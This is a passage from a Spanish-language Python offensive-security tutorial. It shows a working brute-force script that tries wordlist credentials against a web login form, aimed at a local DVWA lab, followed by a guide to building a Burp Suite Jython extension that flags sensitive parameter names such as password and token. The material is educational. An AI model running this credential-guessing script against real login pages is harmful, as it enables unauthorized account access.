        passwords = [p.strip() for p in passwords.readlines()]

    for usuario in usuarios:
        for password in passwords:
            data = {
                "username": usuario,
                "password": password
            }
            print(f"üîÑ Probando {usuario}:{password}")
            try:
                respuesta = requests.post(url_login, data=data)
                if "Login failed" not in respuesta.text and respuesta.status_code == 200:
                    print(f"‚úÖ Credenciales v√°lidas encontradas: {usuario}:{password}")
                    return
            except requests.RequestException as e:
                print(f"‚ö†Ô∏è Error: {e}")

    print("‚ùå No se encontraron credenciales v√°lidas.")

# URL de prueba (usa tu entorno local o DVWA)
if __name__ == "__main__":
    url_objetivo = "http://localhost/dvwa/login.php"  # Cambiar por tu entorno
    fuerza_bruta_login(url_objetivo, "usuarios.txt", "passwords.txt")
```

---

### ‚ñ∂Ô∏è C√≥mo ejecutarlo

```bash
python fuerza_bruta_login.py
```

#### Ejemplo de salida:

```
üîÑ Probando admin:123456
üîÑ Probando admin:admin123
‚úÖ Credenciales v√°lidas encontradas: admin:admin123
```

---

### üì¶ ¬øC√≥mo saber si funcion√≥?

Debes identificar algo **en la respuesta HTTP** que indique un inicio de sesi√≥n exitoso:

- Texto como "Welcome" o "Dashboard"
- Cambio de URL
- Cookie de sesi√≥n
- Redirecci√≥n a otra p√°gina

El script se puede adaptar as√≠:

```python
if "Welcome" in respuesta.text or respuesta.url != url_login:
```

---

### üí° Mejora: A√±adir cabeceras y manejar cookies

Algunos sitios requieren:

```python
headers = {
    "User-Agent": "Mozilla/5.0"
}
session = requests.Session()
session.post(url_login, data=data, headers=headers)
```

---

### ‚úÖ Conclusi√≥n

Con este proyecto aprendiste:

- Qu√© es un ataque de fuerza bruta a formularios web
- C√≥mo automatizarlo con Python
- C√≥mo usar `requests` para enviar credenciales

---

[üîº](#√≠ndice)

---

## **258. Extendiendo Burp Suite con Python**

### üß† ¬øQu√© es extender Burp Suite con Python?

Burp Suite es una herramienta de pruebas de seguridad web. Aunque sus extensiones se escriben **normalmente en Java**, se puede **extender con Python** usando **Jython** (una implementaci√≥n de Python en Java).

Con esto puedes crear **extensiones personalizadas** para automatizar tareas dentro de Burp como:

- Analizar solicitudes/respuestas HTTP
- Filtrar tr√°fico
- Detectar vulnerabilidades espec√≠ficas
- Automatizar escaneos o recolecci√≥n de informaci√≥n

---

#### üîß Requisitos

Antes de empezar, necesitas:

1. **Burp Suite Community o Pro**
2. **Java instalado**
3. **Python 2.7 o 3.x**
4. **Jython** (para que Burp interprete Python)
5. **Un editor de texto o IDE (VSCode, PyCharm, etc.)**

---

### üõ†Ô∏è Instalaci√≥n paso a paso

#### 1. Instalar Burp Suite

Puedes descargarlo desde:
üîó [https://portswigger.net/burp](https://portswigger.net/burp)

Inst√°lalo como cualquier app.

---

#### 2. Descargar Jython

üîó [https://www.jython.org/download](https://www.jython.org/download)

Descarga el archivo `.jar`, por ejemplo:

```
jython-standalone-2.7.3.jar
```

Gu√°rdalo en una carpeta conocida, como:

```bash
~/burp-tools/jython-standalone-2.7.3.jar
```

---

#### 3. Configurar Jython en Burp

1. Abre **Burp Suite**
2. Ve a **Extender ‚Üí Options**
3. En la secci√≥n **Python Environment**, haz clic en **Select file**
4. Selecciona tu archivo `jython-standalone-2.7.3.jar`

Listo. Ahora puedes correr scripts de Python como extensiones de Burp.

---

### üìÑ Estructura m√≠nima de una extensi√≥n Burp en Python

Toda extensi√≥n Burp en Python necesita:

- Una clase que implemente `IBurpExtender`
- Un m√©todo `registerExtenderCallbacks()`

```python
from burp import IBurpExtender

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        callbacks.setExtensionName("Mi primera extensi√≥n")
        print("Extensi√≥n cargada correctamente üéâ")
```

---

### ‚úÖ Ejemplo completo: Analizar solicitudes que contienen par√°metros sensibles

Este ejemplo analiza solicitudes HTTP y **muestra por consola** si detecta par√°metros como `password`, `token`, `secret`, etc.

```python
from burp import IBurpExtender, IHttpListener
import re

PALABRAS_SENSIBLES = ["password", "token", "secret", "apikey"]

class BurpExtender(IBurpExtender, IHttpListener):

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()

        callbacks.setExtensionName("Detector de par√°metros sensibles")
        callbacks.registerHttpListener(self)
        print("‚úÖ Extensi√≥n activada: Detector de par√°metros sensibles")

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not messageIsRequest:
            return  # Solo analizamos solicitudes (requests)

        request = messageInfo.getRequest()
        analyzedRequest = self.helpers.analyzeRequest(request)
        parameters = analyzedRequest.getParameters()

        for param in parameters:
            nombre = param.getName().lower()
            for palabra in PALABRAS_SENSIBLES:
                if palabra in nombre:
                    print(f"‚ö†Ô∏è Par√°metro sensible detectado: {nombre}")
                    print(f"üëâ URL: {analyzedRequest.getUrl()}\n")
```

---

### ‚ñ∂Ô∏è C√≥mo ejecutarlo

1. Guarda el c√≥digo como `detector_parametros.py`
2. Abre Burp > **Extender > Extensions > Add**
3. Elige:

   - **Extension type:** Python
   - **Extension file:** Selecciona `detector_parametros.py`

‚úÖ ¬°Listo! La extensi√≥n comenzar√° a mostrar par√°metros sensibles en la pesta√±a de consola de Burp.

---

### üîÑ ¬øC√≥mo probarlo?

1. Abre un navegador configurado con el proxy de Burp.
2. Visita una URL como:

```
http://testphp.vulnweb.com/login.php?username=test&password=123456
```

3. En la consola de Burp, deber√≠as ver algo como:

```
‚ö†Ô∏è Par√°metro sensible detectado: password
üëâ URL: http://testphp.vulnweb.com/login.php?username=test&password=123456
```

---

### üí° Ideas para mejorar la extensi√≥n

- Guardar los hallazgos en un archivo
- Detectar par√°metros en respuestas (respuestas JSON con claves sensibles)
- Integrar con ZAP o Streamlit para visualizaci√≥n

---

### üìö Recursos √∫tiles

- [Burp Extender API - JavaDoc](https://portswigger.net/burp/extender/api/)
- [Ejemplos oficiales de Burp con Jython](https://github.com/securityMB/burp-py-extensions)
- Libro: _The Web Application Hacker's Handbook_

---

### ‚úÖ Conclusi√≥n

Con esta gu√≠a aprendiste:

- Qu√© es extender Burp con Python
- C√≥mo instalar Jython y configurar el entorno
- Un ejemplo funcional para detectar par√°metros sensibles en tiempo real

---

[üîº](#√≠ndice)

---

| **Inicio**         | **atr√°s 6**                                                                  | **Siguiente 8**                                                  |
| ------------------ | ---------------------------------------------------------------------------- | ---------------------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./4_6_Python_Hacking_y_Explotacion_de_redes_informaticas_con_Python.md) | [‚è©](./4_8_Post_Explotacion_y_evasion_de_defensas_con_Python.md) |
